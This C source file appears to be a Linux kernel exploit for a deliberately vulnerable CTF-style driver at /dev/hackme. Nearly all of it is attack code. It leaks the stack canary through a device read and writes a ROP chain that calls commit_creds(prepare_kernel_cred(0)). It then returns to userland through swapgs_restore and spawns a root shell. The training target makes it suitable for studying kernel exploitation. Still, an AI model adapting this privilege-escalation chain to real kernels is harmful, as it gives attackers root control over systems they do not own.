#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/xattr.h>
#include <unistd.h>

typedef unsigned long ul;

#define DEV_PATH "/dev/hackme"

int dev;

void bak() {
  __asm__ volatile(
      ".intel_syntax noprefix;"
      "mov bak_cs, cs;"
      "mov bak_ss, ss;"
      "mov bak_rsp, rsp;"
      "pushf;"
      "pop bak_rflags;"
      ".att_syntax;");
  puts("[+] Registers backed up");
}

void bin_sh() {
  printf("[+] uid: %d\n", getuid());
  system("/bin/sh");
}

/* Backup registers */
unsigned long bak_cs, bak_rflags, bak_ss, bak_rsp, bak_rip;
unsigned long cookie;
unsigned long bak_rip = (unsigned long)bin_sh;

/* Helper functions */
void debug() {
  puts("[+] Halted execution");
  getchar();
}

void print_dump(unsigned long* data, int len) {
  for (size_t i = 0; i < len; i++) {
    printf("%zu: 0x%lx\n", i, data[i]);
  }
}

void open_dev() {
  dev = open(DEV_PATH, O_RDWR);
  puts("[+] Interacting with device");
}

void err(const char* str) { fprintf(stderr, "[-] %s\n", str); }


#define CANARY_OFF 16
void leak() {
  unsigned long buf[20];
  read(dev, buf, sizeof(buf));
  // print_dump(buf, 20);
  cookie = buf[CANARY_OFF];
}

unsigned long mov_rdi_rax = 0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe73 ; pop rbx ; pop rbp ; ret
unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx ; ret
unsigned long cmp_rdx_8 = 0xffffffff81964cc4; // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
unsigned long pop_rdi = 0xffffffff81006370; // pop rdi; ret
unsigned long iretq = 0xffffffff8100c0d9; // iretq
unsigned long swapgs = 0xffffffff8100a55f; // swapgs ; pop rbp ; ret

unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long commit_creds = 0xffffffff814c6410;
unsigned long swapgs_restore = 0xffffffff81200f10 + 22;

/*
commit_creds(prepare_kernel_cred(0));
restore regs
ret userland
*/
void write_payload() {
  unsigned long payload[50];
  off_t offset = 16;
  // finding padding
  // for (size_t i = 0; i < 50; i++) {
  //   payload[i] = 0x414141414140+i;
  // }
  payload[offset++] = cookie;
  payload[offset++] = 0x0; // rbx
  payload[offset++] = 0x0; // r12
  payload[offset++] = 0x0; // rbp
  payload[offset++] = pop_rdi;
  payload[offset++] = 0x0;
  payload[offset++] = prepare_kernel_cred; // prepare_kernel_cred(0)
  payload[offset++] = pop_rdx_ret;
  payload[offset++] = 8;
  payload[offset++] = cmp_rdx_8;
  payload[offset++] = 0;
  payload[offset++] = 0;
  payload[offset++] = mov_rdi_rax;
  payload[offset++] = 0;
  payload[offset++] = 0;
  payload[offset++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
  payload[offset++] = swapgs_restore;
  payload[offset++] = 0;
  payload[offset++] = 0;
  payload[offset++] = bak_rip;
  payload[offset++] = bak_cs;
  payload[offset++] = bak_rflags;
  payload[offset++] = bak_rsp;
  payload[offset++] = bak_ss;
 
  write(dev, payload, sizeof(payload));
}

/* Exploit */
int main() {
  bak();

  open_dev();
  leak();
  write_payload();
  return 0;
}